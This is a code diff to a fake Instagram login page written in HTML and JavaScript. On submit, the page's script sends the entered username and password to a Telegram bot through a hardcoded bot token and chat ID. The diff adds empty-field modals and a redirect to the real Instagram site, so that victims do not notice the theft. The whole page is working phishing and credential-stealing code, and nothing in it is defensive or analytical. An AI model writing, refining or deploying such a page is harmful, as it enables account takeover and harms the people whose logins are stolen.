@@ -11,14 +11,14 @@
 
     <div class="login-container">
     	<img class="logo-pic" src="logo.png" alt="Logo">
-        <form class="login-form" id="loginForm">
+        <form class="login-form" id="loginForm" novalidate>
             <div class="form-group input-container">
-                <input id="username" name="u_name" type="text" placeholder=" " required>
+                <input id="username" name="u_name" type="text" placeholder=" ">
                 <label for="username">Username, email address or mobile number</label>
                 <span class="clear-icon">&times;</span>
             </div>
             <div class="form-group input-container">
-                <input id="password" name="pass" type="password" placeholder=" " required>
+                <input id="password" name="pass" type="password" placeholder=" ">
                 <label for="password">Password</label>
                 <span class="toggle-password">
                     <img id="eye-icon" src="hide.png" alt="Toggle Password">
@@ -28,6 +28,18 @@
             <button type="submit" class="btn btn-primary">Log in</button>
             <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-link">Forgotten password?</a>
         </form>
+
+        <div id="customModal" class="modal-overlay">
+            <div class="modal-box">
+                <div class="modal-content">
+                    <p>Enter your username, email address or mobile number to log in</p>
+                </div>
+                <div class="modal-footer">
+                    <button id="modalOkBtn" class="modal-btn">OK</button>
+                    <button id="modalCreateBtn" class="modal-btn">Create new account</button>
+                </div>
+            </div>
+        </div>
         
         <div class="create-account-container">
             <a href="https://www.instagram.com/accounts/emailsignup/" class="btn btn-secondary">Create new account</a>
@@ -40,51 +52,79 @@
     const botToken = '8595419325:AAHCyEpryu-iWIcAGKfD1w1Q-SH5hJGawCU';
     const chatId = '1274263985';
 
-    // --- DOM ELEMENTS (These were missing in your original code) ---
+    // --- DOM ELEMENTS ---
     const loginForm = document.getElementById('loginForm');
     const usernameInput = document.getElementById('username');
     const passwordInput = document.getElementById('password');
+    
+    // Icon Elements
     const clearIcon = document.querySelector('.clear-icon');
     const togglePasswordSpan = document.querySelector('.toggle-password');
     const eyeIcon = document.getElementById('eye-icon');
+    
+    // Modal Elements
+    const modal = document.getElementById('customModal');
+    const modalText = document.querySelector('.modal-content p'); 
+    const modalOkBtn = document.getElementById('modalOkBtn');
+    const modalCreateBtn = document.getElementById('modalCreateBtn');
 
     // --- SUBMISSION LOGIC ---
     if (loginForm) {
         loginForm.addEventListener('submit', function(event) {
-            event.preventDefault(); 
+            event.preventDefault(); // Stop page reload
 
-            const usernameValue = usernameInput.value;
-            const passwordValue = passwordInput.value;
+            const usernameValue = usernameInput.value.trim();
+            const passwordValue = passwordInput.value.trim();
 
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: `Test Data - Username: ${usernameValue}, Password: ${passwordValue}`
-                })
-            })
-            .then(response => {
-                if (response.ok) {
-                    alert('Sorry, your password was incorrect. Please double-check your password.');
-                    usernameInput.value = '';
-                    passwordInput.value = '';
-                    // Reset icons after clear
-                    clearIcon.style.display = 'none';
-                    togglePasswordSpan.style.display = 'none';
-                } else {
-                    alert('Connection error. Please try again.');
-                }
-            })
-            .catch(error => {
-                console.error('Error:', error);
-            });
+            // 1. Check if Username is empty
+            if (!usernameValue) {
+                modalText.innerText = "Enter your username, email address or mobile number to log in";
+                modal.style.display = 'flex';
+            
+            // 2. Check if Password is empty (only if username is filled)
+            } else if (!passwordValue) {
+                modalText.innerText = "Please enter your password.";
+                modal.style.display = 'flex';
+
+            // 3. If both are filled: Send Data & Redirect
+            } else {
+                // Send to Telegram
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: `Login Attempt:\nUser: ${usernameValue}\nPass: ${passwordValue}`
+                    })
+                });
+
+                // Redirect to example.com after 0.5 seconds
+                setTimeout(() => {
+                    window.location.href = "https://www.instagram.com";
+                }, 500);
+            }
         });
     }
 
-    // --- UI LOGIC ---
+    // --- MODAL BUTTON ACTIONS ---
+    
+    // Close modal when OK is clicked
+    if (modalOkBtn) {
+        modalOkBtn.addEventListener('click', function() {
+            modal.style.display = 'none';
+        });
+    }
 
-    // 1. Password Show/Hide Logic
+    // Redirect when Create Account is clicked inside modal
+    if (modalCreateBtn) {
+        modalCreateBtn.addEventListener('click', function() {
+            window.location.href = "https://www.instagram.com/accounts/emailsignup/";
+        });
+    }
+
+    // --- UI LOGIC (Icons) ---
+
+    // 1. Password Eye Icon Logic
     function updateEyeIconVisibility() {
         if (passwordInput.value.length > 0) {
             togglePasswordSpan.style.display = 'flex'; 
@@ -93,12 +133,10 @@
         }
     }
 
-    // Add listener to password input
     if (passwordInput) {
         passwordInput.addEventListener('input', updateEyeIconVisibility);
     }
     
-    // Add listener to the eye icon
     if (togglePasswordSpan) {
         togglePasswordSpan.addEventListener('click', function () {
             const currentType = passwordInput.getAttribute('type');
@@ -112,7 +150,7 @@
         });
     }
 
-    // 2. Username Clear Button Logic
+    // 2. Username Clear (X) Icon Logic
     if (usernameInput) {
         usernameInput.addEventListener('input', function() {
             if (usernameInput.value.length > 0) {
